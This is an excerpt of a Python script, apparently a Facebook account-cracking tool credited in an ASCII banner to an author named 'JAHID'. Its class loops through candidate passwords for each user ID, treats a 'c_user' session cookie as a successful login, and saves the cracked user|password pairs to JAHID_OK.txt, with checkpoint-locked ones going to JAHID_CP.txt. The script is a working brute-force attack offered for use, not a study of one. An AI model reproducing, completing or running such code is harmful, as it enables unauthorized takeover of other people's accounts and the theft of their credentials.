...
\$$$$$$  |$$ |  $$ |$$ |  $$ |$$$$$$\ $$$$$$$  |
 \______/ \__|  \__|\__|  \__|\______|\_______/ 
                                                            ...
                                                            \x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m JAHID
\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37mJahid hasan
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m Jahid-444 
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[JAHID] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JAHID-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JAHID_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JAHID-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JAHID_CP.txt' , 'a').write('%s\n' % wrt)
                        break
